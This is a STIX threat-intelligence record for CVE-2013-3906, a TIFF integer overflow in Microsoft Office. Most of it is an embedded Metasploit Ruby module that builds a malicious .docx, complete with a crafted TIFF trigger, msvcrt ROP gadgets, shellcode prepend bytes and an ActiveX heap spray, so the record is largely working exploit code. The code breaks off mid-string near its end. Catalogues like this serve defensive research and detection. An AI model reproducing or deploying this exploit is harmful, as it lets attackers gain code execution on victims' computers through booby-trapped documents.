{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--64b79e02-03a7-46a6-97f0-368b9a41e4a3",
    "created": "2024-08-14T16:38:01.042344Z",
    "modified": "2024-08-14T16:38:01.042349Z",
    "name": "\"MS13-096 Microsoft Tagged Image File Format (TIFF) Integer Overflow\"",
    "description": " This module exploits a vulnerability found in Microsoft's Tagged Image File Format. It was originally discovered in the wild, targeting Windows XP and Windows Server 2003 users running Microsoft Office, specifically in the Middle East and South Asia region.  The flaw is due to a DWORD value extracted from the TIFF file that is embedded as a drawing in Microsoft Office, and how it gets calculated with user-controlled inputs and stored in the EAX register. The 32-bit register will run out of storage space to represent the large value, which ends up being 0, but it still gets pushed as a dwBytes argument (size) for a HeapAlloc call. The HeapAlloc function will allocate a chunk anyway with size 0, and the address of this chunk is used as the destination buffer of a memcpy function, where the source buffer is the EXIF data (an extended image format supported by TIFF), and is also user-controlled. A function pointer in the chunk returned by HeapAlloc will end up being overwritten by the memcpy function, and then later used in OGL!GdipCreatePath. By successfully controlling this function pointer, and the memory layout using ActiveX, it is possible to gain arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/mswin_tiff_overflow.rb",
            "external_id": "mswin_tiff_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3906"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/security/advisory/2896666"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.technet.com/b/srd/archive/2013/11/05/cve-2013-3906-a-graphics-vulnerability-exploited-through-word-documents.aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\nrequire 'nokogiri'\n\nmodule ::Nokogiri\nmodule XML\n  class Builder\n    #\n    # Some XML documents don't declare the namespace before referencing, but Nokogiri requires one.\n    # So here's our hack to get around that by adding a new custom method to the Builder class\n    #\n    def custom_root(ns)\n      e = @parent.create_element(ns)\n      e.add_namespace_definition(ns, \"href\")\n      @ns = e.namespace_definitions.find { |x| x.prefix == ns.to_s }\n      return self\n    end\n  end\nend\nend\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::RopDb\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS13-096 Microsoft Tagged Image File Format (TIFF) Integer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Microsoft's Tagged Image File Format.\n          It was originally discovered in the wild, targeting Windows XP and Windows Server 2003\n          users running Microsoft Office, specifically in the Middle East and South Asia region.\n\n          The flaw is due to a DWORD value extracted from the TIFF file that is embedded as a\n          drawing in Microsoft Office, and how it gets calculated with user-controlled inputs,\n          and stored in the EAX register. The 32-bit register will run out of storage space to\n          represent the large value, which ends up being 0, but it still gets pushed as a\n          dwBytes argument (size) for a HeapAlloc call. The HeapAlloc function will allocate a\n          chunk anyway with size 0, and the address of this chunk is used as the destination buffer\n          of a memcpy function, where the source buffer is the EXIF data (an extended image format\n          supported by TIFF), and is also user-controlled. A function pointer in the chunk returned\n          by HeapAlloc will end up being overwritten by the memcpy function, and then later used\n          in OGL!GdipCreatePath. By successfully controlling this function pointer, and the\n          memory layout using ActiveX, it is possible to gain arbitrary code execution under the\n          context of the user.\n        },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown', # Some dude wrote it and deployed in the wild, but Haifei Li spotted it\n          'sinn3r'   # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-3906' ],\n          [ 'MSB', 'MS13-096' ],\n          [ 'OSVDB', '99376' ],\n          [ 'URL', 'http://technet.microsoft.com/en-us/security/advisory/2896666' ],\n          [ 'URL', 'http://blogs.technet.com/b/srd/archive/2013/11/05/cve-2013-3906-a-graphics-vulnerability-exploited-through-word-documents.aspx' ]\n        ],\n      'Payload'        =>\n        {\n          'PrependEncoder' => \"\\x64\\xa1\\x18\\x00\\x00\\x00\" + # mov eax, fs:[0x18]\n                              \"\\x83\\xC0\\x08\"             + # add eax, byte 8\n                              \"\\x8b\\x20\"                 + # mov esp, [eax]\n                              \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\",  # add esp, -2000\n          'BadChars'       => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n          'PrependMigrate' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # XP SP3 + Office 2010 Standard (14.0.6023.1000 32-bit)\n          ['Windows XP SP3 with Office Standard 2010', {}],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-11-05', # Microsoft announcement\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [true, 'The docx file', 'msf.docx']),\n        ])\n  end\n\n  #\n  # Creates a TIFF that triggers the overflow\n  #\n  def make_tiff\n    # TIFF Header:\n    # TIFF ID                               = 'II' (Intel order)\n    # TIFF Version                          = 42d\n    # Offset of FID                         = 0x000049c8h\n    #\n    # Image Directory:\n    # Number of entries                     = 17d\n    # Entry[0]  NewSubFileType              = 0\n    # Entry[1]  ImageWidth                  = 256d\n    # Entry[2]  ImageHeight                 = 338d\n    # Entry[3]  BitsPerSample               = 8 8 8\n    # Entry[4]  Compression                 = JPEG (6)\n    # Entry[5]  Photometric Interpretation  = RGP\n    # Entry[6]  StripOffsets                = 68 entries (349 bytes)\n    # Entry[7]  SamplesPerPixel             = 3\n    # Entry[8]  RowsPerStrip                = 5\n    # Entry[9]  StripByteCounts             = 68 entries (278 bytes)\n    # Entry[10] XResolution                 = 96d\n    # Entry[11] YResolution                 = 96d\n    # Entry[12] Planar Configuration        = Clunky\n    # Entry[13] Resolution Unit             = Inch\n    # Entry[14] Predictor                   = None\n    # Entry[15] JPEGInterchangeFormatLength = 5252h (1484h)\n    # Entry[16] JPEGInterchangeFormat       = 13636d\n\n    # Notes:\n    # These values are extracted from the file to calculate the HeapAlloc size that result in the overflow:\n    # - JPEGInterchangeFormatLength\n    # - DWORD at offset 3324h (0xffffb898), no documentation for this\n    # - DWORDS after offset 3328h, no documentation for these, either.\n    # The DWORD at offset 4874h is what ends up overwriting the function pointer by the memcpy\n    # The trigger is really a TIF file, but is named as a JPEG in the docx package\n\n    buf = ''\n    path = ::File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2013-3906\", \"word\", \"media\", \"image1.jpeg\")\n    ::File.open(path, \"rb\") do |f|\n      buf = f.read\n    end\n\n    # Gain control of the call [eax+50h] instruction\n    # XCHG EAX, ESP; RETN msvcrt\n    buf[0x4874, 4] = [0x200F0700-0x50].pack('V')\n\n    buf\n  end\n\n\n  #\n  # Generates a payload\n  #\n  def get_rop_payload\n    p = ''\n    p << [0x77c15ed5].pack('V') # XCHG EAX, ESP  msvcrt\n    p << generate_rop_payload('msvcrt','',{'target'=>'xp'})\n    p << payload.encoded\n    block  = p\n    block << rand_text_alpha(1024 - 80 - p.length)\n    block << [ 0x77c34fbf, 0x200f0704 ].pack(\"V*\") # pop esp # ret # from msvcrt\n    block << rand_text_alpha(1024 - block.length)\n\n    buf = ''\n    while (buf.length < 0x80000)\n      buf << block\n    end\n\n    buf\n  end\n\n\n  #\n  # Creates an ActiveX bin that will be used as a spray in Office\n  #\n  def make_activex_bin\n    #\n    # How an ActiveX bin is referred:\n    # document.xml.rels -> ActiveX[num].xml -> activeX[num].xml.rels -> ActiveX[num].bin\n    # Every bin is a Microsoft Compound Document File:\n    # http://www.openoffice.org/sc/compdocfileformat.pdf\n\n    # The bin file\n    mscd  = ''\n    mscd << [0xe011cfd0].pack('V')      # File identifier (first 4 byte)\n    mscd << [0xe11ab1a1].pack('V')      # File identifier (second 4 byte)\n    mscd << [0x00000000].pack('V') * 4  # Unique Identifier\n    mscd << [0x003e].pack('v')          # Revision number\n    mscd << [0x0003].pack('v')          # Version number\n    mscd << [0xfffe].pack('v')          # Byte order: Little-Endian\n    mscd << [0x0009].pack('v')          # Sector size\n    mscd << [0x0006].pack('v')          # Size of a short-sector\n    mscd << \"\\x00\" * 10                 # Not used\n    mscd << [0x00000001].pack('V')      # Total number of sectors\n    mscd << [0x00000001].pack('V')      # SecID for the first sector\n    mscd << [0x00000000].pack('V')      # Not used\n    mscd << [0x00001000].pack('V')      # Minimum size of a standard stream\n    mscd << [0x00000002].pack('V')      # Sec ID of first sector\n    mscd << [0x00000001].pack('V')      # Total number of sectors for the short-sector table\n    mscd << [0xfffffffe].pack('V')      # SecID of first sector of the mastser sector table\n    mscd << [0x00000000].pack('V')      # Total number of sectors for master sector talbe\n    mscd << [0x00000000].pack('V')      # SecIDs\n    mscd << [0xffffffff].pack('V') * 4 * 59 # SecIDs\n    mscd[0x200, 4]  = [0xfffffffd].pack('V')\n    mscd[0x204, 12] = [0xfffffffe].pack('V') * 3\n    mscd << Rex::Text.to_unicode(\"Root Entry\")\n    mscd << [0x00000000].pack('V') * 11\n    mscd << [0x0016].pack('v')          # Valid range of the previous char array\n    mscd << \"\\x05\"                      # Type of entry (Root Storage Entry)\n    mscd << \"\\x00\"                      # Node colour of the entry (red)\n    mscd << [0xffffffff].pack('V')      # DirID of the left child node\n    mscd << [0xffffffff].pack('V')      # DirID of the right child node\n    mscd << [0x00000001].pack('V')      # DirID of the root node entry\n    mscd << [0x1efb6596].pack('V')\n    mscd << [0x11d1857c].pack('V')\n    mscd << [0xc0006ab1].pack('V')\n    mscd << [0x283628f0].pack('V')\n    mscd << [0x00000000].pack('V') * 3\n    mscd << [0x287e3070].pack('V')\n    mscd << [0x01ce2654].pack('V')\n    mscd << [0x00000003].pack('V')\n    mscd << [0x00000100].pack('V')\n    mscd << [0x00000000].pack('V')\n    mscd << Rex::Text.to_unicode(\"Contents\")\n    mscd << [0x00000000].pack('V') * 12\n    mscd << [0x01020012].pack('V')\n    mscd << [0xffffffff].pack('V') * 3\n    mscd << [0x00000000].pack('V') * 10\n    mscd << [0x000000e4].pack('V')\n    mscd << [0x00000000].pack('V') * 18\n    mscd << [0xffffffff].pack('V') * 3\n    mscd << [0x00000000].pack('V') * 29\n    mscd << [0xffffffff].pack('V') * 3\n    mscd << [0x00000000].pack('V') * 12\n    mscd << [0x00000001].pack('V')\n    mscd << [0x00000002].pack('V')\n    mscd << [0x00000003].pack('V')\n    mscd << [0xfffffffe].pack('V')\n    mscd << [0xffffffff].pack('V') * 32 #52\n    mscd << [0x77c34fbf].pack('V') # POP ESP # RETN\n    mscd << [0x200f0704].pack('V') # Final payload target address to begin the ROP\n    mscd << [0xffffffff].pack('V') * 18\n    mscd << @rop_payload\n\n    mscd\n  end\n\n\n  #\n  # Creates an activeX[num].xml file\n  # @param rid [String] The relationship ID (example: rId1)\n  # @return [String] XML document\n  #\n  def make_activex_xml(rid)\n    attrs = {\n      'ax:classid'     => \"{1EFB6596-857C-11D1-B16A-00C0F0283628}\",\n      'ax:license'     => \"9368265E-85FE-11d1-8BE3-0000F8754DA1\",\n      'ax:persistence' => \"persistStorage\",\n      'r:id'           => \"rId#{rid.to_s}\",\n      'xmlns:ax'       => \"http://schemas.microsoft.com/office/2006/activeX\",\n      'xmlns:r'        => @schema\n    }\n    md = ::Nokogiri::XML(\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"no\\\"?>\")\n    builder = ::Nokogiri::XML::Builder.with(md) do |xml|\n      xml.custom_root(\"ax\")\n      xml.ocx(attrs)\n    end\n\n    builder.to_xml(:indent => 0)\n  end\n\n\n  #\n  # Creates an activeX[num].xml.rels\n  # @param relationships [Array] A collection of hashes with each containing:\n  #                              :id, :type, :target\n  # @return [String] XML document\n  #\n  def make_activex_xml_reals(rid, target_bin)\n    acx_type = \"http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary\"\n    md = ::Nokogiri::XML(\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?>\")\n    builder = ::Nokogiri::XML::Builder.with(md) do |xml|\n    xml.Relationships('xmlns'=>\"http://schemas.openxmlformats.org/package/2006/relationships\") do\n        xml.Relationship({:Id=>\"rId#{rid.to_s}\", :Type=>acx_type, :Target=>target_bin})\n    end\n    end\n\n    builder.to_xml(:indent => 0)\n  end\n\n  #\n  # Creates a document.xml.reals file\n  # @param relationships [Array] A collection of hashes with each containing:\n  #                              :id, :type, and :target\n  # @return [String] XML document\n  #\n  def make_doc_xml_reals(relationships)\n    md = ::Nokogiri::XML(\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?>\")\n    builder = ::Nokogiri::XML::Builder.with(md) do |xml|\n    xml.Relationships('xmlns'=>\"http://schemas.openxmlformats.org/package/2006/relationships\") do\n      relationships.each do |r|\n        xml.Relationship({:Id=>\"rId#{r[:id].to_s}\", :Type=>r[:type], :Target=>r[:target]})\n      end\n    end\n    end\n\n    builder.to_xml(:indent => 0)\n  end\n\n\n  #\n  # Creates a _rels/.rels file\n  #\n  def init_rels(doc_xml, doc_props)\n    rels = []\n    rels << doc_xml\n    rels << doc_props\n    rels = rels.flatten\n\n    md = ::Nokogiri::XML(\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?>\")\n    builder = ::Nokogiri::XML::Builder.with(md) do |xml|\n    xml.Relationships('xmlns'=>\"http://schemas.openxmlformats.org/package/2006/relationships\") do\n      rels.each do |r|\n        xml.Relationship({:Id=>\"rId#{r[:id].to_s}\", :Type=>r[:type], :Target=>r[:fname].gsub(/^\\//, '')})\n      end\n    end\n    end\n\n    {\n      :fname => \"_rels/.rels\",\n      :data  => builder.to_xml(:indent => 0)\n    }\n  end\n\n\n  #\n  # Creates a run element for chart\n  # @param xml [Element]\n  # @param rid [String]\n  #\n  def create_chart_run_element(xml, rid)\n    drawingml_schema = \"http://schemas.openxmlformats.org/drawingml/2006\"\n\n    xml.r do\n      xml.rPr do\n        xml.noProof\n        xml.lang({'w:val' => \"en-US\"})\n      end\n\n      xml.drawing do\n        xml['wp'].inline({'distT'=>\"0\", 'distB'=>\"0\", 'distL'=>\"0\", 'distR'=>\"0\"}) do\n          xml['wp'].extent({'cx'=>'1', 'cy'=>'1'})\n          xml['wp'].effectExtent({'l'=>\"1\", 't'=>\"0\", 'r'=>\"1\", 'b'=>\"0\"})\n          xml['wp'].docPr({'id'=>rid.to_s, 'name' => \"drawing #{rid.to_s}\"})\n          xml['wp'].cNvGraphicFramePr\n\n          xml['a'].graphic do\n            xml['a'].graphicData({'uri'=>\"#{drawingml_schema}/chart\"}) do\n              xml['c'].chart({'r:id'=>\"rId#{rid.to_s}\"})\n            end\n          end\n        end\n      end\n    end\n  end\n\n\n  #\n  # Creates a run element for ax\n  # @param xml [Element]\n  # @param rid [String]\n  #\n  def create_ax_run_element(xml, rid)\n    shape_attrs = {\n      'id'    => \"_x0000_i10#{rid.to_s}\",\n      'type'  => \"#_x0000_t75\",\n      'style' => \"width:1pt;height:1pt\",\n      'o:ole' => \"\"\n    }\n\n    control_attrs = {\n      'r:id'      => \"rId#{rid.to_s}\",\n      'w:name'    => \"TabStrip#{rid.to_s}\",\n      'w:shapeid' =>\"_x0000_i10#{rid.to_s}\"\n    }\n\n    xml.r do\n      xml.object({'w:dxaOrig'=>\"1440\", 'w:dyaOrig'=>\"1440\"}) do\n        xml['v'].shape(shape_attrs)\n        xml['w'].control(control_attrs)\n      end\n    end\n  end\n\n\n  #\n  # Creates a pic run element\n  # @param xml [Element]\n  # @param rid [String]\n  #\n  def create_pic_run_element(xml, rid)\n    drawinxml_schema = \"http://schemas.openxmlformats.org/drawingml/2006\"\n\n    xml.r do\n      xml.rPr do\n        xml.noProof\n        xml.lang({'w:val'=>\"en-US\"})\n      end\n\n      xml.drawing do\n        xml['wp'].inline({'distT'=>\"0\", 'distB'=>\"0\", 'distL'=>\"0\", 'distR'=>\"0\"}) do\n          xml.extent({'cx'=>'1', 'cy'=>'1'})\n          xml['wp'].effectExtent({'l'=>\"1\", 't'=>\"0\", 'r'=>\"0\", 'b'=>\"0\"})\n          xml['wp'].docPr({'id'=>rid.to_s, 'name'=>\"image\", 'descr'=>\"image.jpeg\"})\n          xml['wp'].cNvGraphicFramePr do\n            xml['a'].graphicFrameLocks({'xmlns:a'=>\"#{drawinxml_schema}/main\", 'noChangeAspect'=>\"1\"})\n          end\n\n          xml['a'].graphic({'xmlns:a'=>\"#{drawinxml_schema}/main\"}) do\n            xml['a'].graphicData({'uri'=>\"#{drawinxml_schema}/picture\"}) do\n              xml['pic'].pic({'xmlns:pic'=>\"#{drawinxml_schema}/picture\"}) do\n                xml['pic'].nvPicPr do\n                  xml['pic'].cNvPr({'id'=>rid.to_s, 'name'=>\"image.jpeg\"})\n                  xml['pic'].cNvPicPr\n                end\n\n                xml['pic'].blipFill do\n                  xml['a'].blip('r:embed'=>\"rId#{rid.to_s}\", 'cstate'=>\"print\")\n                  xml['a'].stretch do\n                    xml['a'].fillRect\n                  end\n                end\n\n                xml['pic'].spPr do\n                  xml['a'].xfrm do\n                    xml['a'].off({'x'=>\"0\", 'y'=>\"0\"})\n                    xml['a'].ext({'cx'=>\"1\", 'cy'=>\"1\"})\n                  end\n\n                  xml['a'].prstGeom({'prst' => \"rect\"}) do\n                    xml['a'].avLst\n                  end\n                end\n              end\n            end\n          end\n        end\n      end\n    end\n  end\n\n\n  #\n  # Creates a document.xml file\n  # @param pre_defs [Array]\n  # @param activex [Array]\n  # @param tiff_file [Array]\n  # @return [String] XML document\n  #\n  def init_doc_xml(last_rid, pre_defs, activex, tiff_file)\n    # Get all the required pre-defs\n    chart_rids = []\n    pre_defs.select { |e| chart_rids << e[:id] if e[:fname] =~ /\\/word\\/charts\\//}\n\n    # Get all the ActiveX RIDs\n    ax_rids = []\n    activex.select { |e| ax_rids << e[:id] }\n\n    # Get the TIFF RID\n    tiff_rid = tiff_file[:id]\n\n    # Documentation on how this is crafted:\n    # http://msdn.microsoft.com/en-us/library/office/gg278308.aspx\n    doc_attrs = {\n      'xmlns:ve'  => \"http://schemas.openxmlformats.org/markup-compatibility/2006\",\n      'xmlns:o'   => \"urn:schemas-microsoft-com:office:office\",\n      'xmlns:r'   => @schema,\n      'xmlns:m'   => \"http://schemas.openxmlformats.org/officeDocument/2006/math\",\n      'xmlns:v'   => \"urn:schemas-microsoft-com:vml\",\n      'xmlns:wp'  => \"http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing\",\n      'xmlns:w10' => \"urn:schemas-microsoft-com:office:word\",\n      'xmlns:w'   => \"http://schemas.openxmlformats.org/wordprocessingml/2006/main\",\n      'xmlns:wne' => \"http://schemas.microsoft.com/office/word/2006/wordml\",\n      'xmlns:a'   => \"http://schemas.openxmlformats.org/drawingml/2006/main\",\n      'xmlns:c'   => \"http://schemas.openxmlformats.org/drawingml/2006/chart\"\n    }\n\n    p_attrs_1 = {'w:rsidR' => \"00F8254F\", 'w:rsidRDefault' => \"00D15BD0\" }\n    p_attrs_2 = {'w:rsidR' => \"00D15BD0\", 'w:rsidRPr' =>\"00D15BD0\", 'w:rsidRDefault' => \"00D15BD0\" }\n\n    md = ::Nokogiri::XML(\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?>\")\n    builder = ::Nokogiri::XML::Builder.with(md) do |xml|\n      xml.custom_root(\"w\")\n\n      xml.document(doc_attrs) do\n        xml.body do\n          # Paragraph (ActiveX)\n          xml.p(p_attrs_1) do\n            # Paragraph properties\n            xml.pPr do\n              # Run properties\n              xml.rPr do\n                xml.lang({'w:val' => \"en-US\"})\n              end\n            end\n\n            ax_rids.each do |rid|\n              create_ax_run_element(xml, rid)\n            end\n          end\n\n          xml.p(p_attrs_2) do\n            xml.pPr do\n              xml.rPr do\n                xml['w'].lang({'w:val'=>\"en-US\"})\n              end\n            end\n\n            # Charts\n            chart_rids.each do |rid|\n              create_chart_run_element(xml, rid)\n            end\n\n            # TIFF\n            create_pic_run_element(xml, tiff_rid)\n          end\n        end\n      end\n    end\n\n    {\n      :id           => (last_rid + 1).to_s,\n      :type         => \"#{@schema}/officeDocument\",\n      :fname        => \"/word/document.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml\",\n      :xml          => builder.to_xml(:indent => 0)\n    }\n  end\n\n  #\n  # Creates a [Content.Types].xml file located in the parent directory\n  # @param overrides [Array] A collection of hashes with each containing\n  #                          the :PartName and :ContentType info\n  # @return [String] XML document\n  #\n  def make_contenttype_xml(overrides)\n    contenttypes = [\n      {\n        :Extension   => \"rels\",\n        :ContentType => \"application/vnd.openxmlformats-package.relationships+xml\"\n      },\n      {\n        :Extension   => \"xml\",\n        :ContentType => \"application/xml\"\n      },\n      {\n        :Extension   => \"jpeg\",\n        :ContentType => \"image/jpeg\"\n      },\n      {\n        :Extension   => \"bin\",\n        :ContentType => \"application/vnd.ms-office.activeX\"\n      },\n      {\n        :Extension  => \"xlsx\",\n        :ContentType => \"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\"\n      }\n    ]\n\n    md = ::Nokogiri::XML(\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?>\")\n    builder = ::Nokogiri::XML::Builder.with(md) do |xml|\n    xml.Types({'xmlns'=>\"http://schemas.openxmlformats.org/package/2006/content-types\"}) do\n      # Default extensions\n      contenttypes.each do |contenttype|\n        xml.Default(contenttype)\n      end\n\n      # Additional overrides\n      overrides.each do |override|\n        override_attrs = {\n          :PartName    => override[:PartName] || override[:fname],\n          :ContentType => override[:ContentType]\n        }\n        xml.Override(override_attrs)\n      end\n    end\n    end\n\n    builder.to_xml(:indent => 0)\n  end\n\n\n  #\n  # Pre-define some items that will be used in .rels\n  #\n  def init_doc_props(last_rid)\n    items = []\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"#{@schema}/extended-properties\",\n      :fname        => \"/docProps/app.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.extended-properties+xml\"\n    }\n\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties\",\n      :fname        => \"/docProps/core.xml\",\n      :content_type => \"application/vnd.openxmlformats-package.core-properties+xml\"\n    }\n\n    return last_rid, items\n  end\n\n\n  #\n  # Pre-define some items that will be used in document.xml.rels\n  #\n  def init_doc_xml_rels_items(last_rid)\n    items = []\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"#{@schema}/styles\",\n      :fname        => \"/word/styles.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml\"\n    }\n\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"#{@schema}/settings\",\n      :fname        => \"/word/settings.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml\"\n    }\n\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"#{@schema}/webSettings\",\n      :fname        => \"/word/webSettings.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.wordprocessingml.webSettings+xml\"\n    }\n\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"#{@schema}/fontTable\",\n      :fname        => \"/word/fontTable.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.wordprocessingml.fontTable+xml\"\n    }\n\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"#{@schema}/theme\",\n      :fname        => \"/word/theme/theme1.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.theme+xml\"\n    }\n\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"#{@schema}/chart\",\n      :fname        => \"/word/charts/chart1.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.drawingml.chart+xml\"\n    }\n\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"#{@schema}/chart\",\n      :fname        => \"/word/charts/chart2.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.drawingml.chart+xml\"\n    }\n\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"#{@schema}/chart\",\n      :fname        => \"/word/charts/chart3.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.drawingml.chart+xml\"\n    }\n\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"#{@schema}/chart\",\n      :fname        => \"/word/charts/chart4.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.drawingml.chart+xml\"\n    }\n\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"#{@schema}/chart\",\n      :fname        => \"/word/charts/chart5.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.drawingml.chart+xml\"\n    }\n\n    items << {\n      :id           => (last_rid += 1),\n      :type         => \"#{@schema}/chart\",\n      :fname        => \"/word/charts/chart6.xml\",\n      :content_type => \"application/vnd.openxmlformats-officedocument.drawingml.chart+xml\"\n    }\n\n    return last_rid, items\n  end\n\n\n  #\n  # Manually create everything manually in the ActiveX directory\n  #\n  def init_activex_files(last_rid)\n    activex = []\n\n    0x250.times do |i|\n      id = (last_rid += 1)\n\n      bin  = {\n        :fname => \"/word/activeX/activeX#{id.to_s}.bin\",\n        :bin => make_activex_bin\n      }\n\n      xml  = {\n        :fname => \"/word/activeX/activeX#{id.to_s}.xml\",\n        :xml => make_activex_xml(id)\n      }\n\n      rels = {\n        :fname => \"/word/activeX/_rels/activeX#{id.to_s}.xml.rels\",\n        :rels => make_activex_xml_reals(id, \"activeX#{id.to_s}.bin\")\n      }\n\n      ct   = \"application/vnd.ms-office.activeX+xml\"\n      type = \"#{@schema}/control\"\n\n      activex << {\n        :id           => id,\n        :bin          => bin,\n        :xml          => xml,\n        :rels         => rels,\n        :content_type => ct,\n        :type         => type\n      }\n    end\n\n    return last_rid, activex\n  end\n\n\n  #\n  # Create a [Content_Types.xml], each node contains these attributes:\n  # :PartName     The path to an ActiveX XML file\n  # :ContentType  The contenttype of the XML file\n  #\n  def init_contenttype_xml_file(*items)\n    overrides = []\n    items.each do |item|\n      item.each do |obj|\n        overrides << {:PartName => obj[:fname] || obj[:xml][:fname], :ContentType => obj[:content_type]}\n      end\n    end\n\n    {:fname => \"[Content_Types].xml\", :data => make_contenttype_xml(overrides)}\n  end\n\n\n  #\n  # Creates the tiff file\n  #\n  def init_tiff_file(last_rid)\n    id = last_rid + 1\n    tiff_data = {\n      :id   => id,\n      :fname => \"/word/media/image1.jpeg\",\n      :data  => make_tiff,\n      :type  => \"#{@schema}/image\"\n    }\n\n    return id, tiff_data\n  end\n\n  #\n  # Create the document.xml.rels file\n  #\n  def init_doc_xml_reals_file(pre_defs, activex, tiff)\n    reals = []\n    pre_defs.each do |obj|\n      reals << {:id => obj[:id], :type => obj[:type], :target => obj[:fname].gsub(/^\\/word\\//, '')}\n    end\n\n    activex.each do |obj|\n      reals << {:id => obj[:id], :type => obj[:type], :target => obj[:xml][:fname].gsub(/^\\/word\\//, '')}\n    end\n\n    reals << {:id => tiff[:id], :type => tiff[:type], :target => tiff[:fname].gsub(/^\\/word\\//, '')}\n\n    {:fname => \"/word/_rels/document.xml.rels\", :data => make_doc_xml_reals(reals)}\n  end\n\n  #\n  # Loads a file\n  #\n  def read_file(fname)\n    buf = ''\n    ::File.open(fname, \"rb\") do |f|\n      buf << f.read\n    end\n\n    buf\n  end\n\n\n  #\n  # Packages everything to docx\n  #\n  def make_docx(path)\n    print_status(\"Initializing files...\")\n    last_rid = 0\n    last_rid, doc_xml_rels_items = init_doc_xml_rels_items(last_rid)\n    last_rid, activex            = init_activex_files(last_rid)\n    last_rid, doc_props          = init_doc_props(last_rid)\n    last_rid, tiff_file          = init_tiff_file(last_rid)\n    doc_xml                      = init_doc_xml(last_rid, doc_xml_rels_items, activex, tiff_file)\n    ct_xml_file                  = init_contenttype_xml_file(activex, doc_xml_rels_items, doc_props, [doc_xml])\n    doc_xml_reals_file           = init_doc_xml_reals_file(doc_xml_rels_items, activex, tiff_file)\n    rels_xml                     = init_rels(doc_xml, doc_props)\n\n    zip = Rex::Zip::Archive.new\n    Dir[\"#{path}/**/**\"].each do |file|\n      p = file.sub(path+'/','')\n\n      if File.directory?(file)\n        print_status(\"Packing directory: #{p}\")\n        zip.add_file(p)\n      else\n        # Avoid packing image1.jpeg because we'll load it separately\n        if file !~ /media\\/image1\\.jpeg/\n          print_status(\"Packing file: #{p}\")\n          zip.add_file(p, read_file(file))\n        end\n      end\n    end\n\n    print_status(\"Packing ActiveX controls...\")\n    activex.each do |ax|\n      ax_bin  = ax[:bin]\n      ax_xml  = ax[:xml]\n      ax_rels = ax[:rels]\n\n      vprint_status(\"Packing file: #{ax_bin[:fname]}\")\n      zip.add_file(ax_bin[:fname], ax_bin[:bin])\n\n      vprint_status(\"Packing file: #{ax_xml[:fname]}\")\n      zip.add_file(ax_xml[:fname], ax_xml[:xml])\n\n      vprint_status(\"Packing file: #{ax_rels[:fname]}\")\n      zip.add_file(ax_rels[:fname], ax_rels[:rels])\n    end\n\n    print_status(\"Packing file: #{ct_xml_file[:fname]}\")\n    zip.add_file(ct_xml_file[:fname], ct_xml_file[:data])\n\n    print_status(\"Packing file: #{tiff_file[:fname]}\")\n    zip.add_file(tiff_file[:fname], tiff_file[:data])\n\n    print_status(\"Packing file: #{doc_xml[:fname]}\")\n    zip.add_file(doc_xml[:fname], doc_xml[:xml])\n\n    print_status(\"Packing file: #{rels_xml[:fname]}\")\n    zip.add_file(rels_xml[:fname], rels_xml[:data])\n\n    print_status(\"Packing file: 